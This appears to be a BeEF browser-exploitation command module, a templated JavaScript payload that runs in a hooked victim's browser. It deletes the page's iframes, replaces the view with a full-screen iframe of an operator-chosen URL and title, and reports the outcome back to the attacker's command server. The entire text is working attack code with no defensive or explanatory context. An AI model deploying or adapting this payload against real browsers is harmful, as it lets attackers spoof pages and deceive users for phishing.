beef.execute(function() {

	var result = 'Iframe successfully created!';
	var title = '<%= @iframe_title %>';
	var iframe_src = '<%= @iframe_src %>';
	var sent = false;

	$j("iframe").remove();
	
	beef.dom.createIframe('fullscreen', {}, iframe_src, function() { if(!sent) { sent = true; document.title = title; beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result)); } });

	setTimeout(function() { 
		if(!sent) {
			result = 'Iframe failed to load, timeout';
			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
			document.title = iframe_src + " is not available";
			sent = true;
		}
	}, <%= @iframe_timeout %>);

});